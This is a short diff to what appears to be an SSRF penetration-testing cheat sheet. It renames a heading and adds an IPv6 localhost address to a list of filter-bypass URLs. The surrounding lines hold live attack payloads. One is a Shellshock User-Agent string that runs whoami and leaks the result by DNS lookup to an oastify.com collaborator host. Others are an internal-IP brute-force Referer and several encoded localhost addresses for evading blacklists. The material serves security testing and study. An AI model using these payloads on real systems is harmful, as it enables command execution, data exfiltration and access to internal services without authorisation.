@@ -51,7 +51,7 @@ Referer: http://burpcollaborator.net
 User-Agent: () { :; }; /usr/bin/nslookup $(whoami).3kobqoj8uv6qbwwlkaf5cvzr1i79v0jp.oastify.com >> Change Uger-Agent info
 Referer: http://192.168.0.$1$:8080 >> Bruteforce the ip
 ```
-## Circumventing common SSRF defenses
+## Bypassing common SSRF defenses
 _____________________________________
 ### SSRF with blacklist-based input filters
 ```txt
@@ -59,6 +59,7 @@ http://127.1
 http://2130706433
 http://017700000001
 http://127.0.0.1:21/?%0A >> You can change port number if needed.
+http://[::]:80/ 
 http://spoofed.burpcollaborator.net
 ```
 ### SSRF with whitelist-based input filters
